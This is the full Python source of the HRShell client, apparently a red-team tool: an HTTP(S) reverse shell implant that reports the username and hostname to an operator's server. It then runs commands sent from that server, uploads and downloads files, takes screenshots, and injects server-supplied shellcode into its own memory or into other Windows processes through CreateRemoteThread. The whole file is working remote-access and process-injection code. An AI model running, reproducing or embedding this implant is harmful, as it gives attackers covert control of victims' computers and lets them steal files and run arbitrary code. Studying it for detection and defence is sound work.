#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__Author__      = 'Christophoros Petrou (game0ver)'
__Project_url__ = 'https://github.com/chrispetrou/HRShell'
__License__     = 'GNU General Public License v3.0'
__Version__     = '1.7'

import os
import re
import io
import sys
import mmap
import time
import socket
import platform
import warnings
import subprocess
from base64 import (
    b64encode as benc,
    urlsafe_b64decode as bdec
)
from urllib.parse import (
    unquote,
    urlparse
)
from argparse import (
    SUPPRESS,
    ArgumentParser,
    ArgumentTypeError,
    RawTextHelpFormatter
)
from ctypes import *
from random import randint
from threading import Thread
from requests import Session
from requests.exceptions import *
from multiprocessing import Process
warnings.filterwarnings("ignore")


special_commands = ["upload", "download", "setshellcode"]
chg_dir    = re.compile(r'^\s*cd (.*)$')
unix_path  = re.compile(r'^(.+/)*([^/]+)$')
wind_path  = re.compile(r'^(.+\\)*([^/]+)$')
hexdmp     = re.compile(r'^\s*hex\s+(.*)\s*$')
screenshot = re.compile(r'^\s*screenshot\s*$')
migrate    = re.compile(r'^\s*migrate\s+(\d+)\s*$')
inject     = re.compile(r'^\s*inject\s+shellcode\s*$')

# windows only
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS     = 0x001F0FFF
VIRTUAL_MEM            = ( 0x00001000 | 0x00002000 )
try:
    kernel32 = windll.kernel32
except NameError:
    pass

CERT = None
SERVER = None
shellcode = b""


def console():
    parser = ArgumentParser(description="{}client.py:{} An HTTP(S) client with advanced features.".format('\033[1m', '\033[0m'),
                formatter_class=RawTextHelpFormatter)
    parser._optionals.title = "{}arguments{}".format('\033[1m', '\033[0m')
    parser.add_argument('-s', "--server",
                type=validateServer,
                default=None, required=False, metavar='',
                help="Specify an HTTP(S) server to connect to.")
    parser.add_argument('-c', "--cert",
                required=False, metavar='',
                help="Specify a certificate to use.")
    parser.add_argument('-p', "--proxy",
                type=validateProxy,
                default=None, required=False, metavar='',
                help="Specify a proxy to use [form: host:port]")
    args = parser.parse_args()
    return args

def validateServer(url):
    try:
        if not url.endswith('/'):
            res = urlparse(url+'/')
        else:
            res = urlparse(url)
        if all([res.scheme, res.netloc, res.path]):
            return url
        else:
            raise ArgumentTypeError('[x] The "--server" must be in the form: http(s)://(ip or domain):port')
    except Exception as error:
        raise error

def validatePort(port):
    if isinstance(int(port), int):
        if 1 < int(port) < 65536:
            return int(port)
        else:
            raise ArgumentTypeError('[x] Port must be in range 1-65535')
    else:
        raise ArgumentTypeError('Port must be in range 1-65535')

def validateIP(ip):
    try:
        if socket.inet_aton(ip):
            return ip
    except socket.error:
        raise ArgumentTypeError('[x] Invalid IP provided')

def validateProxy(proxy):
    if not ':' in proxy or proxy.count(':') != 1:
        raise ArgumentTypeError('[x] Proxy must be in the form: host:port')
    else:
        host, port = proxy.split(':')
        if validateIP(host) and validatePort(port):
            return proxy

def valid_file(filepath):
    try:
        if not os.path.isfile(filepath):
            return False
        return True if os.access(filepath, os.R_OK) else False
    except:
        return False

def current_dir(cwd):
    try:
        if os.name == "nt":
            cwd_name = '\\'+[x for x in cwd.split('\\') if x != ''][-1]
        else:
            cwd_name = '/'+[x for x in cwd.split('/') if x != ''][-1]
    except IndexError:
        cwd_name = '/'
    return cwd_name

def exec_cmd(cmd):
    cmd_output = subprocess.Popen(cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT)
    return cmd_output.communicate()

def abs_path(file):
    return os.path.abspath(file)

def is_os_64bit():
    return platform.machine().endswith('64')

def migrate_res(pid, retcode):
    result = {
        1 : "Shellcode successfully injected on PID: {} ".format(pid),
        2 : "Couldn't acquire a handle to PID: {}".format(pid),
        3 : "Failed to inject shellcode on process with PID: {} ".format(pid)
    }
    return result[retcode]

def migrate_to_pid(pid):
    """
    This function is inspired & adapted from the "GRAY HAT PYTHON" book.
    However it's modified to work also for x64 Windows systems.
    """
    try:
        h_process  = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
        if not h_process:
            return 2
        arg_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, arg_address, shellcode, len(shellcode), byref(c_int(0)))
        if is_os_64bit():
            return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_int64(0))) else 1
        else:
            return 3 if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(c_ulong(0))) else 1
    except Exception as error:
        return 3

# For now works on both linux x86/x64 bit :)
# taken from: https://github.com/thomaskeck/PyShellCode
def create_shellcode_Func(restype=c_int64, argtypes=()):
    if not is_os_64bit():
        restype = c_int32
    mm = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
    mm.write(shellcode)
    ctypes_buffer = c_int.from_buffer(mm)
    function = CFUNCTYPE(restype, *argtypes)(addressof(ctypes_buffer))
    function._avoid_gc_for_mmap = mm
    return function

def inject_shellcode_unix(s):
    try:
        shellcode_injection = create_shellcode_Func()
        shellcode_injection()
    except Exception as error:
        s.post(SERVER,
            data='Shellcode injection failed...\nERROR: {}'.format(error)
        )

# Inspired, taken and adapted from this great article:
# http://www.debasish.in/2012/04/execute-shellcode-using-python.html
def inject_shellcode_windows(s):
    try:
        arg_address = kernel32.VirtualAlloc(0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
        kernel32.RtlMoveMemory(arg_address, shellcode, len(shellcode))
        thrd = kernel32.CreateThread(0, 0, arg_address, 0, 0, 0)
        s.post(SERVER, data="Shellcode injected successfully...")
        kernel32.WaitForSingleObject(thrd,-1)
    except Exception as error:
        s.post(SERVER, data=error)

def hexdump(src, length=16):
    """
    Taken from: https://gist.github.com/7h3rAm/5603718
    """
    FILTER, lines = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)]), []
    for c in range(0, len(src), length):
        chars = src[c:c+length]
        hexa = ' '.join(["%02x" % ord(x) for x in chars]) if type(chars) is str else ' '.join(['{:02x}'.format(x) for x in chars])
        if len(hexa) > 24: hexa = "%s %s" % (hexa[:24], hexa[24:])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars]) if type(chars) is str else ''.join(['{}'.format((x <= 127 and FILTER[x]) or '.') for x in chars])
        lines.append("%08x:  %-*s  |%s|" % (c, length*3, hexa, printable))
    return '\n'.join(lines)

username, error = exec_cmd("whoami")
if os.name=='nt':
    username = username.decode('utf-8').split('\\')[1]
hostname, error = exec_cmd("hostname")
try:
    cwd = current_dir(os.getcwd())
except OSError:
    if os.name == 'nt':
        cwd = '\\'
    else:
        cwd = "/"

_headers = {
    "username" : username.strip(),
    "hostname" : hostname.strip(),
    "directory": cwd
}

try:
    args = console()
    if args.server:
        SERVER = args.server
    else:
        if not SERVER:
            sys.exit(0)
    with Session() as s:
        if args.proxy:
            host, port = args.proxy.split(':')
            s.proxies = {"http":'{}:{}'.format(host,int(port)),
                         "https":'{}:{}'.format(host,int(port))}
        if args.cert:
            s.verify = abs_path(args.cert)
        elif CERT:
            with open('.cert.pem', 'w') as w: w.write(CERT)
            s.verify = abs_path(".cert.pem")
        else:
            s.verify = False

        while True:
            res = s.get(SERVER, headers=_headers)
            if any(command in res.url for command in special_commands):
                if 'upload' in res.url:
                    filename = res.url.split('/')[-1]
                    with open(filename, 'wb') as w:
                        w.write(bdec(res.text))
                    s.post(SERVER,
                        headers={
                                "Filename" : filename,
                                "Action"   : 'upload'
                            },
                        data='Upload Successful!')
                elif 'download' in res.url:
                    filepath = bdec(str(unquote(res.url.split('/')[-1]))).decode("utf-8")
                    if valid_file(filepath):
                        with open(filepath, 'rb') as f:
                            file_contents = f.read()
                        if unix_path.match(filepath):
                            file_name = unix_path.search(filepath).group(2)
                        else:
                            file_name = wind_path.search(filepath).group(2)
                        s.post(SERVER,
                            headers={
                                "Filename" : file_name,
                                "Action"   : 'download'
                            },
                            data=file_contents)
                    else:
                        s.post(SERVER, data='ERROR: File does not exist or is not readable!')
                else:
                    shl_id = res.url.split('/')[-1]
                    shellcode = res.content
                    s.post(SERVER,
                        headers={
                            "Shellcode_id": shl_id
                        },
                    data=f"{shl_id}")
            else:
                cmd = res.text
                if cmd:
                    if cmd == "exit":
                        sys.exit(0)
                    if chg_dir.match(cmd):
                        try:
                            directory = chg_dir.search(cmd).group(1)
                            if os.name == "nt":
                                if not directory.endswith('\\'): directory += '\\'
                            else:
                                if not directory.endswith('/'): directory += '/'
                            os.chdir(directory)
                            _headers['directory'] =  current_dir(os.getcwd())
                        except OSError as dir_error:
                            s.post(SERVER, data="ERROR: {}".format(dir_error))
                        except Exception as error:
                            s.post(SERVER, data="ERROR: {}".format(error))
                    elif screenshot.match(cmd):
                        try:
                            from PIL import ImageGrab
                            screen_shot = ImageGrab.grab()
                            image_data = io.BytesIO()
                            screen_shot.save(image_data, format='PNG')
                            s.post(SERVER,
                                headers={
                                    "Action"   : 'screenshot'
                                },
                                data=image_data.getvalue()
                            )
                        except ImportError:
                            s.post(SERVER, data='ERROR: Pillow module is not installed.')
                        except Exception as screenshot_error:
                            s.post(SERVER, data=str(screenshot_error))
                    elif inject.match(cmd):
                        if os.name == 'nt':
                            if not is_os_64bit():
                                if shellcode:
                                    t = Thread(target=inject_shellcode_windows,
                                        args=(s,)
                                    )
                                    t.daemon = True
                                    t.start()
                                    time.sleep(1)
                                else:
                                    s.post(SERVER, data='No shellcode specified....')
                            else:
                                s.post(SERVER,
                                    data='For now "inject shellcode" command is available only for 32bit-windows systems.'
                                )
                        else:
                            if shellcode:
                                t = Process(target=inject_shellcode_unix,
                                    args=(s,)
                                )
                                t.start()
                                time.sleep(1)
                            else:
                                s.post(SERVER,
                                    data='No shellcode specified...'
                                )
                    elif migrate.match(cmd):
                        if os.name == 'nt':
                            if shellcode:
                                pid = migrate.search(cmd).group(1)
                                res = migrate_to_pid(pid)
                                s.post(SERVER, data=migrate_res(pid, res))
                            else:
                                s.post(SERVER, data='No shellcode specified....')
                        else:
                            s.post(SERVER,
                                data='For now "migrate" command is available only for x86 & x64 windows systems.'
                            )
                    elif hexdmp.match(cmd):
                        file2hex = hexdmp.search(cmd).group(1)
                        if valid_file(file2hex):
                            with open(file2hex, 'rb') as f: data = f.read()
                            hex_content = hexdump(data)
                            s.post(SERVER,
                                data=hex_content
                            )
                        else:
                            s.post(SERVER, data="File doesn't exist or is not readable.")
                    else:
                        try:
                            stdout, stderr = exec_cmd(cmd)
                            if stderr:
                                cmd_output = stderr
                            else:
                                cmd_output = stdout
                        except Exception as error:
                            cmd_output = error
                            continue
                        s.post(SERVER, data=cmd_output)
except KeyboardInterrupt:
    sys.exit(0)
except ConnectionError:
    sys.exit(0)
except TooManyRedirects:
    sys.exit(0)
except Exception as error:
    raise(error)